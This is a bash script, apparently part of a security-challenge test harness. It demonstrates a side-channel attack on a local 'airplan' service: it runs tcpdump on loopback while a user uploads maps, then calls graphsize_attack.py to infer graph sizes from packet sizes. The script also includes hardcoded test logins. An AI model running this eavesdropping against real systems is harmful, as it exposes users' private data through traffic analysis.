#!/bin/bash
set -e

# rebuild?
REBUILD=0

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi

export PYTHONPATH=$PYTHONPATH:../../../examples

# step 0, if necessary, gather data for mapping packet sizes to number of vertices in the uploaded graph
# Note: rebuilding takes many hours
if [ $REBUILD -eq 1 ]; then
    echo "build database"
    python graphsize_attack.py 127.0.0.1 8443 american buihw09H2 lo build graphsize.db
fi

# step 1, start tcpdump
echo "Start eavesdropping on user"

# set a timeout in case the test fails and doesn't shut down tcpdump
timeout 1200 /usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 8443 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user login and perform graph uploads unknown to attacker
echo "User uploads some maps and views their passenger capacity matrices"
python ../../../examples/airplan_client.py 127.0.0.1 8443 indigo nn55io3J4 matrix -file maps/map_a.txt -file maps/map_b.txt -file maps/map_c.txt -file maps/test_map100.txt -file maps/test_map253.txt -file maps/test_map352.txt > /dev/null
sleep 2

# step 3, stop tcpdump
echo "Stop eavesdropping"
kill $TCPDUMP_PID > /dev/null

# step 4, determine sizes of graphs sent
echo "determine size of sent maps"
python graphsize_attack.py 127.0.0.1 8443 american buihw09H2 lo attack usertraffic.pcap graphsize.db property_sizes.db
